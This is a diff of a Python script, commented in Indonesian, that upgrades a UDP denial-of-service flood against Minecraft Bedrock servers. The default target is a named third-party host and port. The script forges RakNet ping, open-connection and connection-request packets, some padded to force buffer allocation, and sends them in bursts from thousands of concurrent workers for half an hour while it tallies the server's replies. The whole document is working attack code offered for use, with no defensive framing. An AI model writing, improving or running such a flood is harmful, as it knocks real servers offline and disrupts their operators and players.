@@ -1,4 +1,4 @@
-# bedrock_load.py — RakNet multi-vector flood, gacor edition
+# bedrock_load.py v2 — RakNet handshake-aware flood
 # python 3.12 | stdlib only
 
 import asyncio
@@ -12,97 +12,120 @@ import time
 HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
 PORT     = int(os.environ.get("PORT", "5073"))
 DURATION = int(os.environ.get("DURATION", "1800"))
-CONC     = int(os.environ.get("CONC", "5000"))
+CONC     = int(os.environ.get("CONC", "3000"))
 SOCKET_PER_WORKER = int(os.environ.get("SOCKETS", "2"))
 SHARD    = os.environ.get("SHARD", "0")
 
-RAKNET_MAGIC = bytes([
+MAGIC = bytes([
     0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
     0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
 ])
 
-# Rentang protocol version RakNet Bedrock 1.20.x — variasi biar servernya
-# ga bisa pakai fast-path cache
-PROTO_VERSIONS = [11, 10, 9, 8]
+# protocol version RakNet — Bedrock 1.20.x
+RAK_PROTO = 11
 
 
 def pkt_ping():
-    """0x01 unconnected ping — server balas 0x1c unconnected pong + info."""
+    """0x01 unconnected ping — server balas 0x1c pong (MOTD + info)."""
     t = random.getrandbits(64)
     g = random.getrandbits(64)
-    return b"\x01" + struct.pack(">Q", t) + RAKNET_MAGIC + struct.pack(">Q", g)
+    return b"\x01" + struct.pack(">Q", t) + MAGIC + struct.pack(">Q", g)
 
 
 def pkt_oc1():
     """0x05 open connection request 1 — server alokasi state, balas 0x06."""
-    proto = random.choice(PROTO_VERSIONS)
-    mtu_pad = random.choice([0, 100, 500, 1200, 1400])
-    return (b"\x05" + RAKNET_MAGIC + bytes([proto])
-            + struct.pack(">H", mtu_pad))
+    # MTU size harus 18 byte minimum (RakNet spec) — isi dengan 0x00
+    mtu = random.choice([1492, 1200, 576])
+    mtu_field = b"\x00" * (mtu - 18)  # payload padding sampe MTU
+    return b"\x05" + MAGIC + bytes([RAK_PROTO]) + mtu_field
 
 
-def pkt_oc2():
-    """0x07 open connection request 2 — server proses encryption handshake."""
-    cookie = random.getrandbits(32)
-    return (b"\x07" + RAKNET_MAGIC + struct.pack(">I", cookie)
-            + bytes([random.randint(0, 1)]))
+def pkt_oc2(cookie: bytes = b"\x00\x00\x00\x00", secure: bool = False):
+    """0x07 open connection request 2 — server balas 0x08 (encryption)."""
+    server_addr = random.randbytes(7)   # 4 byte IP + 2 byte port (varian)
+    mtu = struct.pack(">H", 1400)
+    client_guid = struct.pack(">Q", random.getrandbits(64))
+    return (b"\x07" + MAGIC + bytes([RAK_PROTO]) + server_addr
+            + b"\x04\x00" + mtu + b"\x00" + client_guid)
 
 
-def pkt_incompat():
-    """0x19 incompatible protocol — server kadang balas + log."""
-    proto = random.choice(PROTO_VERSIONS)
-    return (b"\x19" + bytes([proto]) + RAKNET_MAGIC
+def pkt_conn_req():
+    """0x09 connection request — server accept kalo handshake bener."""
+    guid = struct.pack(">Q", random.getrandbits(64))
+    t = struct.pack(">Q", random.getrandbits(64))
+    use_sec = b"\x00"
+    return b"\x09" + MAGIC + guid + t + use_sec
+
+
+def pkt_new_incom():
+    """0x19 incompatible protocol."""
+    return (b"\x19" + bytes([RAK_PROTO]) + MAGIC
             + struct.pack(">Q", random.getrandbits(64)))
 
 
-def pkt_oc1_oversized():
-    """0x05 dengan padding gede — paksa server alokasi buffer lebih."""
-    proto = random.choice(PROTO_VERSIONS)
+def pkt_unconn_ping_oversized():
+    """0x01 ping + padding 1400 byte — server parse payload lebih lama."""
+    t = struct.pack(">Q", random.getrandbits(64))
+    g = struct.pack(">Q", random.getrandbits(64))
     pad = os.urandom(random.randint(1200, 1400))
-    return b"\x05" + RAKNET_MAGIC + bytes([proto]) + pad
+    return b"\x01" + t + MAGIC + g + pad
 
 
-PACKET_BUILDERS = [
-    (pkt_ping, 0.35),
-    (pkt_oc1, 0.30),
-    (pkt_oc2, 0.20),
-    (pkt_incompat, 0.10),
-    (pkt_oc1_oversized, 0.05),
+PACKET_POOL = [
+    (pkt_ping, 0.30),
+    (pkt_unconn_ping_oversized, 0.15),
+    (pkt_oc1, 0.25),
+    (pkt_oc2, 0.15),
+    (pkt_conn_req, 0.10),
+    (pkt_new_incom, 0.05),
 ]
 
 
 def pick_pkt():
     r = random.random()
     cum = 0.0
-    for builder, weight in PACKET_BUILDERS:
-        cum += weight
+    for builder, w in PACKET_POOL:
+        cum += w
         if r <= cum:
             return builder()
     return pkt_ping()
 
 
-# ---- stats ----
 class Stats:
     def __init__(self):
         self.sent = 0
         self.rx = 0
         self.rx_bytes = 0
+        self.rx_pong = 0     # packet id 0x1c
+        self.rx_reply1 = 0   # packet id 0x06
+        self.rx_reply2 = 0   # packet id 0x08
+        self.rx_other = 0
         self.fail = 0
         self.start = time.time()
         self.lock = asyncio.Lock()
 
-    async def inc(self, sent=0, rx=0, b=0, fail=0):
+    async def inc(self, sent=0, rx=0, b=0, fail=0, pid=None):
         async with self.lock:
             self.sent += sent
             self.rx += rx
             self.rx_bytes += b
             self.fail += fail
+            if pid == 0x1c:
+                self.rx_pong += 1
+            elif pid == 0x06:
+                self.rx_reply1 += 1
+            elif pid == 0x08:
+                self.rx_reply2 += 1
+            elif pid is not None:
+                self.rx_other += 1
 
     def snap(self) -> str:
         dt = max(1e-6, time.time() - self.start)
         ratio = (self.rx / self.sent * 100) if self.sent else 0.0
         return (f"[shard {SHARD}] sent={self.sent} rx={self.rx} "
-                f"({ratio:.1f}%) rxb={self.rx_bytes} fail={self.fail} "
+                f"({ratio:.1f}%) pong={self.rx_pong} r1={self.rx_reply1} "
+                f"r2={self.rx_reply2} oth={self.rx_other} "
+                f"rxb={self.rx_bytes} fail={self.fail} "
                 f"rate={self.sent / dt:.0f} pkt/s")
 
 
@@ -127,24 +150,22 @@ class BedrockWorker:
             sock = self.socks[self.rr]
             self.rr = (self.rr + 1) % len(self.socks)
             try:
-                # burst: kirim 4 paket berturut-turut sebelum yield
-                for _ in range(4):
+                for _ in range(6):
                     pkt = pick_pkt()
                     try:
                         sock.sendto(pkt, (HOST, PORT))
                         await STATS.inc(sent=1)
                     except OSError:
                         await STATS.inc(fail=1)
-                # baca balasan (non-blocking) — sampe buffer abis
-                for _ in range(8):
+                for _ in range(10):
                     try:
                         data, _ = sock.recvfrom(4096)
-                        await STATS.inc(rx=1, b=len(data))
+                        pid = data[0] if data else None
+                        await STATS.inc(rx=1, b=len(data), pid=pid)
                     except BlockingIOError:
                         break
                     except OSError:
                         break
-                # yield ringan — jangan burn CPU lokal
                 await asyncio.sleep(0)
             except Exception:
                 await STATS.inc(fail=1)
